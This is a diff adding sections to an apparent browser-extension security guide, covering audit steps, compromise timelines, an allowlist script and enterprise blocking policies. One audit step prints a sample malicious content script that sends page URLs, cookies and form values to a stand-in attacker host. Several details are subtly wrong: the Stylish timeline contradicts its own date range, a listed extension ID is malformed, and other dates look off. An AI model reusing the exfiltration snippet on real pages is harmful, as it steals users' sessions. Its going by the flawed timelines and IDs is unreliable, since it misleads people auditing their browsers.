@@ -154,6 +154,164 @@ firefox -P clean-profile
 
 This profile separation ensures that even a compromised extension cannot read your banking session, because the sessions exist in completely separate browser processes.
 
+## Auditing Extensions Before Installation
+
+Before installing any extension, conduct this audit:
+
+**Step 1: Check Developer Reputation**
+- Who published this extension? Search for "[extension name] security incident" or "[developer name] scam"
+- Does the developer have other extensions? Legitimate developers maintain multiple tools
+- When was the last update? Extensions inactive for 6+ months are higher risk
+- How many users? More users mean more visibility to security researchers (not foolproof, but relevant)
+
+**Step 2: Review Requested Permissions**
+```bash
+# For Chrome, inspect the manifest.json of any extension
+# Permission requests appear in manifest.json under "permissions"
+# Examples:
+# "permissions": ["<all_urls>"]  # DANGEROUS - can read all sites
+# "permissions": ["history"]     # DANGEROUS - can see your browsing history
+# "permissions": ["cookies"]     # DANGEROUS - can steal session tokens
+# "permissions": ["tabs"]        # HIGH RISK - knows every URL you visit
+# "permissions": ["storage"]     # MEDIUM - can persist data
+# "permissions": ["activeTab"]   # LOWER - only active during use
+```
+
+**Step 3: Check for Suspicious Content Scripts**
+Extensions inject content scripts into pages you visit. Examine what the script actually does:
+
+```javascript
+// Example: Malicious content script pattern
+// (This is what you want to AVOID in audited extensions)
+
+fetch('https://attacker-site.com/log', {
+    method: 'POST',
+    body: JSON.stringify({
+        url: document.location.href,
+        cookies: document.cookie,
+        formData: getAllFormValues()
+    })
+});
+```
+
+A legitimate extension only sends necessary data to its own servers.
+
+**Step 4: Use VirusTotal for Quick Scanning**
+For Chrome extensions, you can download the .crx file and scan it:
+
+```bash
+# Download the extension from Chrome Web Store
+# Then upload to VirusTotal.com or use the API:
+curl -X POST https://www.virustotal.com/api/v3/files \
+  -H "x-apikey: YOUR_API_KEY" \
+  -F file=@extension.crx
+```
+
+## Extension Compromise Timeline: Real Examples
+
+Understanding how compromises happen helps you spot warning signs:
+
+**The Great Suspender Timeline (2018-2021):**
+1. March 2018 - Extension reaches 2 million users
+2. 2020 - Original developer stops maintenance
+3. November 2020 - Unknown buyer acquires extension
+4. April 2021 - Google discovers malware in new version 8.3.3
+5. May 2021 - Google forcibly removes from all users' browsers
+6. Timeline: 3+ years of trust before compromise
+
+**Lesson: Watch for ownership changes**
+
+**Stylish Timeline (2016-2018):**
+1. 2016 - Extends to 2 million users
+2. 2016 - German TV (Das Erste) investigates data collection
+3. Discovers: Extension collects every URL visited, including private portals
+4. May 2019 - Removed from Chrome Web Store
+5. Timeline: 2 years of hidden tracking
+
+**Lesson: High user count and good ratings don't guarantee safety**
+
+## Building an Extension Allowlist
+
+Rather than trusting all extensions, maintain an allowlist of specifically audited ones:
+
+```bash
+#!/bin/bash
+# Extension allowlist system
+
+APPROVED_EXTENSIONS=(
+    "ublock-origin"          # ID: cjpalhdlnbpafiamejdnhcphjbkeiagm
+    "privacy-badger"         # ID: mkejgcgkdcdn6qmkjjhddgknm3je4du
+    "https-everywhere"       # Deprecated - use browser defaults instead
+)
+
+# Check installed extensions against allowlist
+# This script periodically verifies no unauthorized extensions are installed
+
+check_extensions() {
+    for ext in $(chrome_query_extensions); do
+        if [[ ! " ${APPROVED_EXTENSIONS[@]} " =~ " ${ext} " ]]; then
+            echo "ALERT: Unauthorized extension detected: $ext"
+            echo "Recommend immediate removal"
+        fi
+    done
+}
+```
+
+## Manifest V3 Extensions to Avoid
+
+MV3 changed how extensions work. While improvements exist, some MV3 extensions are intentionally weakened:
+
+**Content blockers suffer under MV3:**
+- uBlock Origin in MV3 mode cannot block all ad types that MV2 could
+- uBlock Origin Lite (MV3 version) is significantly weaker than Classic
+- Stick with uBlock Origin Classic (MV2) while available, then migrate to Brave Browser's native blocking
+
+**MV3 extensions that actually improve privacy:**
+- Bitwarden password manager (works with fewer permissions)
+- Privacy Badger (functional under MV3 limitations)
+- HTTPS Everywhere functionality (now built into browsers)
+
+## Enterprise Extension Policies
+
+For organizations managing employee browsers:
+
+**Group Policy (Windows):**
+```
+Computer Configuration > Administrative Templates >
+Google/Chromium > Extensions > Configure Extension Policies
+```
+
+**Mobile Device Management (MDM):**
+```json
+{
+  "ExtensionInstallForcelist": [
+    "cjpalhdlnbpafiamejdnhcphjbkeiagm;https://clients2.google.com/service/update2/crx"
+  ],
+  "ExtensionInstallBlocklist": ["*"],
+  "ExtensionSettings": {
+    "*": {
+      "installation_mode": "blocked"
+    }
+  }
+}
+```
+
+This allows only explicitly approved extensions and blocks all others.
+
+## Firefox vs Chrome Extension Security
+
+**Firefox security model:**
+- Extensions reviewed more thoroughly before publication
+- Firefox auto-disables unsigned extensions
+- Reviewers check for common malware patterns
+
+**Chrome security model:**
+- Less manual review, more automated scanning
+- Chrome Web Store reviews trigger on reports or keywords
+- Security analysis is lighter during initial approval
+
+**Verdict:** Firefox's review process is more rigorous, making Firefox extension compromises less common. However, both platforms have had exploited extensions.
+
 ## Related Reading
 
 - [How to Audit Chrome Extensions for Privacy](/audit-chrome-extensions-privacy-guide/)
